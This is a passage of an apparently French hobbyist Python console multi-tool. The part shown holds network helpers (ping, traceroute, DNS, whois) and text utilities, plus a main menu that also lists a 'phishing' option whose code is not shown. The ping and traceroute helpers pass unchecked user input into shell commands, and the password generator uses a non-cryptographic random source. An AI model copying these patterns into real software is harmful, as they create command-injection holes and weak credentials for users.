        r = requests.head(url, allow_redirects=True, timeout=10)
        print(f"\n  [OK] EXPANDEE!")
        print(f"  Originale: {url}")
        print(f"  Finale: {r.url}")
        print(f"  Status: {r.status_code}")
        print(f"  Redirects: {len(r.history)}")
        for i, h in enumerate(r.history): print(f"  -> {i+1}. {h.url} ({h.status_code})")
    except Exception as e: print(f"\n  [!] Erreur: {e}")
    pause()

# ============================================================
# 8. RESEAU TOOLS
# ============================================================

def reseau_menu():
    while True:
        clear()
        print("=" * 60)
        print("     RESEAU TOOLS")
        print("=" * 60)
        print()
        print("  [1]  Ping - Tester connexion")
        print("  [2]  Traceroute - Tracer le chemin")
        print("  [3]  Port Scan - Scan ports avance")
        print("  [4]  DNS Lookup - Requetes DNS")
        print("  [5]  Whois - Info whois")
        print("  [0]  RETOUR")
        print()
        choix = input("  Choix: ").strip()
        if choix == "1": reseau_ping()
        elif choix == "2": reseau_traceroute()
        elif choix == "3": reseau_port_scan()
        elif choix == "4": reseau_dns_lookup()
        elif choix == "5": reseau_whois()
        elif choix == "0": break

def reseau_ping():
    clear()
    print("=" * 60)
    print("     PING")
    print("=" * 60)
    print()
    target = input("  IP ou domaine: ").strip()
    count = input("  Nombre de pings (defaut 4): ").strip() or "4"
    try:
        if os.name == "nt":
            os.system(f"ping -n {count} {target}")
        else:
            os.system(f"ping -c {count} {target}")
    except Exception as e: print(f"  [!] Erreur: {e}")
    pause()

def reseau_traceroute():
    clear()
    print("=" * 60)
    print("     TRACEROUTE")
    print("=" * 60)
    print()
    target = input("  IP ou domaine: ").strip()
    try:
        if os.name == "nt":
            os.system(f"tracert {target}")
        else:
            os.system(f"traceroute {target}")
    except Exception as e: print(f"  [!] Erreur: {e}")
    pause()

def reseau_port_scan():
    web_port_scan()

def reseau_dns_lookup():
    clear()
    print("=" * 60)
    print("     DNS LOOKUP")
    print("=" * 60)
    print()
    domain = input("  Domaine: ").strip()
    rtype = input("  Type (A/AAAA/MX/TXT/NS/CNAME/ALL): ").strip().upper() or "ALL"
    try:
        import dns.resolver
        types = ["A","AAAA","MX","TXT","NS","CNAME"] if rtype == "ALL" else [rtype]
        print(f"\n  [OK] DNS RECORDS:")
        for t in types:
            try:
                answers = dns.resolver.resolve(domain, t)
                for r in answers: print(f"  {t}: {r}")
            except Exception as e: print(f"  {t}: {e}")
    except ImportError:
        print(f"\n  [!] Module dns.resolver manquant!")
        print(f"  Installe: pip install dnspython")
    pause()

def reseau_whois():
    clear()
    print("=" * 60)
    print("     WHOIS")
    print("=" * 60)
    print()
    domain = input("  Domaine: ").strip()
    try:
        import whois
        w = whois.whois(domain)
        print(f"\n  [OK] WHOIS:")
        print(f"  Domain: {w.domain_name}")
        print(f"  Registrar: {w.registrar}")
        print(f"  Creation: {w.creation_date}")
        print(f"  Expiration: {w.expiration_date}")
        print(f"  NS: {w.name_servers}")
    except ImportError:
        print(f"\n  [!] Module whois manquant!")
        print(f"  Installe: pip install python-whois")
        try:
            ip = socket.gethostbyname(domain)
            print(f"  IP: {ip}")
        except: pass
    except Exception as e: print(f"\n  [!] Erreur: {e}")
    pause()

# ============================================================
# 9. UTILITAIRES
# ============================================================

def utils_menu():
    while True:
        clear()
        print("=" * 60)
        print("     UTILITAIRES")
        print("=" * 60)
        print()
        print("  [1]  Password Generator")
        print("  [2]  Base64 Encode/Decode")
        print("  [3]  Hash Generator (MD5, SHA1, SHA256)")
        print("  [4]  URL Encode/Decode")
        print("  [5]  JSON Formatter")
        print("  [6]  UUID Generator")
        print("  [7]  String Reverse / Case Swap")
        print("  [8]  Random User-Agent")
        print("  [0]  RETOUR")
        print()
        choix = input("  Choix: ").strip()
        if choix == "1": utils_password_gen()
        elif choix == "2": utils_base64()
        elif choix == "3": utils_hash()
        elif choix == "4": utils_url_encode()
        elif choix == "5": utils_json_format()
        elif choix == "6": utils_uuid()
        elif choix == "7": utils_string_tools()
        elif choix == "8": utils_random_ua()
        elif choix == "0": break

def utils_password_gen():
    clear()
    print("=" * 60)
    print("     PASSWORD GENERATOR")
    print("=" * 60)
    print()
    length = input("  Longueur (defaut 16): ").strip()
    try: length = int(length)
    except: length = 16
    count = input("  Nombre (defaut 5): ").strip()
    try: count = int(count)
    except: count = 5
    use_special = input("  Caracteres speciaux? (o/n, defaut o): ").strip().lower() != "n"
    chars = string.ascii_letters + string.digits
    if use_special: chars += "!@#$%^&*()_+-=[]{}|;:,.<>?"
    print(f"\n  [OK] MOTS DE PASSE:")
    for i in range(count):
        pwd = ''.join(random.choice(chars) for _ in range(length))
        print(f"  {i+1}. {pwd}")
    pause()

def utils_base64():
    clear()
    print("=" * 60)
    print("     BASE64 ENCODE/DECODE")
    print("=" * 60)
    print()
    print("  [1] Encoder")
    print("  [2] Decoder")
    print()
    choix = input("  Choix: ").strip()
    text = input("  Texte: ").strip()
    try:
        if choix == "1":
            print(f"\n  [OK] Encode: {base64.b64encode(text.encode()).decode()}")
        elif choix == "2":
            print(f"\n  [OK] Decode: {base64.b64decode(text).decode()}")
    except Exception as e: print(f"\n  [!] Erreur: {e}")
    pause()

def utils_hash():
    clear()
    print("=" * 60)
    print("     HASH GENERATOR")
    print("=" * 60)
    print()
    text = input("  Texte: ").strip()
    print(f"\n  [OK] HASHES:")
    print(f"  MD5:    {hashlib.md5(text.encode()).hexdigest()}")
    print(f"  SHA1:   {hashlib.sha1(text.encode()).hexdigest()}")
    print(f"  SHA256: {hashlib.sha256(text.encode()).hexdigest()}")
    print(f"  SHA512: {hashlib.sha512(text.encode()).hexdigest()}")
    pause()

def utils_url_encode():
    clear()
    print("=" * 60)
    print("     URL ENCODE/DECODE")
    print("=" * 60)
    print()
    print("  [1] Encoder")
    print("  [2] Decoder")
    print()
    choix = input("  Choix: ").strip()
    text = input("  Texte: ").strip()
    try:
        if choix == "1": print(f"\n  [OK] Encode: {quote(text)}")
        elif choix == "2": print(f"\n  [OK] Decode: {unquote(text)}")
    except Exception as e: print(f"\n  [!] Erreur: {e}")
    pause()

def utils_json_format():
    clear()
    print("=" * 60)
    print("     JSON FORMATTER")
    print("=" * 60)
    print()
    print("  Entre ton JSON (ligne vide pour finir):")
    lines = []
    while True:
        line = input()
        if line.strip() == "": break
        lines.append(line)
    json_str = "\n".join(lines)
    try:
        data = json.loads(json_str)
        formatted = json.dumps(data, indent=2, ensure_ascii=False)
        print(f"\n  [OK] JSON FORMATTE:")
        print("  " + formatted.replace(chr(10), chr(10)+"  "))
    except json.JSONDecodeError as e: print(f"\n  [!] JSON invalide: {e}")
    pause()

def utils_uuid():
    clear()
    print("=" * 60)
    print("     UUID GENERATOR")
    print("=" * 60)
    print()
    count = input("  Nombre (defaut 5): ").strip()
    try: count = int(count)
    except: count = 5
    print(f"\n  [OK] UUIDs:")
    for i in range(count): print(f"  {i+1}. {uuid_mod.uuid4()}")
    pause()

def utils_string_tools():
    clear()
    print("=" * 60)
    print("     STRING TOOLS")
    print("=" * 60)
    print()
    text = input("  Texte: ").strip()
    print(f"\n  [OK] RESULTATS:")
    print(f"  Reverse: {text[::-1]}")
    print(f"  Upper: {text.upper()}")
    print(f"  Lower: {text.lower()}")
    print(f"  Title: {text.title()}")
    print(f"  Length: {len(text)}")
    print(f"  Words: {len(text.split())}")
    pause()

def utils_random_ua():
    clear()
    print("=" * 60)
    print("     RANDOM USER-AGENT")
    print("=" * 60)
    print()
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    ]
    count = input("  Nombre (defaut 3): ").strip()
    try: count = int(count)
    except: count = 3
    print(f"\n  [OK] USER-AGENTS:")
    for i in range(count):
        print(f"  {i+1}. {random.choice(uas)}")
    pause()

# ============================================================
# MAIN
# ============================================================

def main():
    while True:
        choix = menu_principal()
        if choix == "1": generateur_menu()
        elif choix == "2": username_hunter()
        elif choix == "3": discord_menu()
        elif choix == "4": roblox_menu()
        elif choix == "5": phishing_menu()
        elif choix == "6": web_menu()
        elif choix == "7": osint_menu()
        elif choix == "8": reseau_menu()
        elif choix == "9": utils_menu()
        elif choix == "0":
            clear()
            print("=" * 60)
            print("     A bientot, mon cheri!")
            print("     - ENI")
            print("=" * 60)
            break

if __name__ == "__main__":
    main()
